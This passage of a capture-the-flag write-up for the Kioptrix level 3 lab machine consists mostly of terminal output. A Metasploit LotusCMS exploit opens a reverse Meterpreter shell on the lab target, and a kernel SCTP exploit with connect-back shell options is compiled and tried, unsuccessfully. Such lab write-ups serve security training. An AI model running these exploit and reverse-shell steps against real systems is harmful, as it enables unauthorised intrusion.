   18  exploit/windows/lotus/lotusnotes_lzh                     2011-05-24       normal     No     Lotus Notes 8.0.x - 8.5.2 FP2 - Autonomy Keyview (.lzh Attachment)

                                                                                                    
msf5 > use 9                                                  
msf5 exploit(multi/http/lcms_php_exec) > show options          
                                                                                                    
Module options (exploit/multi/http/lcms_php_exec):            
                                                                                                    
   Name     Current Setting  Required  Description               
   ----     ---------------  --------  -----------                    
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)   
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /lcms/           yes       URI
   VHOST                     no        HTTP server virtual host                                                                                                                                                                                                                                                                                                                                                 


Exploit target:

   Id  Name
   --  ----
   0   Automatic LotusCMS 3.0


msf5 exploit(multi/http/lcms_php_exec) > set RHOSTS 192.168.88.131
RHOSTS => 192.168.88.131
msf5 exploit(multi/http/lcms_php_exec) > set VHOST kioptrix3.com
VHOST => kioptrix3.com
msf5 exploit(multi/http/lcms_php_exec) > set URI /
URI => /
msf5 exploit(multi/http/lcms_php_exec) > show options

Module options (exploit/multi/http/lcms_php_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.88.131   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /                yes       URI
   VHOST    kioptrix3.com    no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic LotusCMS 3.0


msf5 exploit(multi/http/lcms_php_exec) > run

[*] Started reverse TCP handler on 192.168.88.128:4444 
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Sending stage (38288 bytes) to 192.168.88.131
[*] Meterpreter session 1 opened (192.168.88.128:4444 -> 192.168.88.131:57972) at 2020-01-04 15:22:46 +0100
meterpreter > sysinfo
Computer    : Kioptrix3
OS          : Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
Meterpreter : php/linux
meterpreter > getuid 
Server username: www-data (33)
meterpreter > shell
Process 4390 created.
Channel 7 created.
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 8.04.3 LTS
Release:        8.04
Codename:       hardy

```

#### Priv Esc

```
root@kali:~/kioptrix/level3# searchsploit -m exploits/linux/remote/8556.c
  Exploit: Linux Kernel 2.6.20/2.6.24/2.6.27_7-10 (Ubuntu 7.04/8.04/8.10 / Fedora Core 10 / OpenSuse 11.1) - SCTP FWD Memory Corruption Remote Overflow
      URL: https://www.exploit-db.com/exploits/8556
     Path: /usr/share/exploitdb/exploits/linux/remote/8556.c
File Type: C source, ASCII text, with CRLF line terminators

Copied to: /root/kioptrix/level3/8556.c


root@kali:~/kioptrix/level3# gcc 8556.c -o 8556
8556.c:32:10: fatal error: netinet/sctp.h: No such file or directory
   32 | #include <netinet/sctp.h>
      |          ^~~~~~~~~~~~~~~~
compilation terminated.
root@kali:~/kioptrix/level3# apt install libsctp-dev
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libayatana-ido3-0.4-0 libbfio1 libdvdread4 libhogweed4 libhwloc5 libisl21 libjim0.77 libjte1 libnettle6 libobjc-9-dev python-magic python-paramiko python-pefile python-qrcode
Use 'apt autoremove' to remove them.
The following additional packages will be installed:
  libsctp1
Suggested packages:
  lksctp-tools
The following NEW packages will be installed:
Get:1 http://ftp1.nluug.nl/os/Linux/distr/kali kali-rolling/main amd64 libsctp1 amd64 1.0.18+dfsg-1 [28.3 kB]
Get:2 http://ftp2.nluug.nl/os/Linux/distr/kali kali-rolling/main amd64 libsctp-dev amd64 1.0.18+dfsg-1 [81.5 kB]
Fetched 110 kB in 1s (153 kB/s)   
Selecting previously unselected package libsctp1:amd64.
(Reading database ... 311290 files and directories currently installed.)....................................................................................................................................................................................................................................................................................................................................] 
Preparing to unpack .../libsctp1_1.0.18+dfsg-1_amd64.deb ...
Unpacking libsctp1:amd64 (1.0.18+dfsg-1) ...
Selecting previously unselected package libsctp-dev:amd64.
Preparing to unpack .../libsctp-dev_1.0.18+dfsg-1_amd64.deb ...
Unpacking libsctp-dev:amd64 (1.0.18+dfsg-1) ...
Setting up libsctp1:amd64 (1.0.18+dfsg-1) ...
Setting up libsctp-dev:amd64 (1.0.18+dfsg-1) ...
Processing triggers for man-db (2.9.0-2) ...
Processing triggers for libc-bin (2.29-3) ...
root@kali:~/kioptrix/level3# gcc 8556.c -o 8556
root@kali:~/kioptrix/level3# chmod +x 8556
root@kali:~/kioptrix/level3# ./8556 
./sctp_houdini 
        -H lhost   (local host address for connect back shel)
        -P lport   (local port address for connect back shell)
        -h rhost   (remote target host)
        -p rport   (remote target port)
        -t kernel  (target kernel)
        -s sport   (source port defining sctp association where corruption occurs)
                   (always use higher port if you run the exploit multiple times eg. 20000, 21000, etc..)
                   (NEVER reuse the same or next port or vsys will be trashed and init will die soon...)
        -c conn    (number of connectionis before corruption - default 600)

./8556 -H 192.168.88.128 -P 4444 -h 192.168.88.131 -p 80 -t a -s 20000
Unable to find target: a
Available targets are:
- ubuntu64_faisty-2.6.20-[15-17]-generic  (faisty: generic kernel)
- ubuntu64_faisty-2.6.20-17-server  (faisty: server kernel - last 2.6.20-17 build)
- ubuntu64_hardy-2.6.24-[18-21]-generic  (kernel from 2.6.24-18 to kernel 2.6.24-21 -- generic)
- ubuntu64_hardy_2.6.24-[16-18]-server  (kernel from 2.6.24-16 to 2.6.24-18 -- server)
- ubuntu64_hardy-2.6.24-[19-22]-server  (kernel from 2.6.24-19 to 2.6.24-22 -- server)
- ubuntu64_hardy-2.6.24-23-last-server  (last 2.6.24-23 kernel before patch -- server)
- ubuntu64_intrepid-2.6.27-7-server  (kernel 2.6.27-7 -- server)
- ubuntu64_intrepid-2.6.27-[9-last]-server  (kernel 2.6.27-9 to the last unpatched kernel -- server)
- ubuntu64_intrepid-2.6.27-[7-last]-generic  (kernel 2.6.27-9 to the last unpatched kernel -- server)
- fedora64_10-2.6.25-117  (fedora core 10 default installed kernel)
- opensuse64_11.1-2.6.27.7-9-default  (opensuse 11.1 default installed kernel)
``` 

Doenst work on our kernel, latest supported is ubuntu64_hardy-2.6.24-23-last-server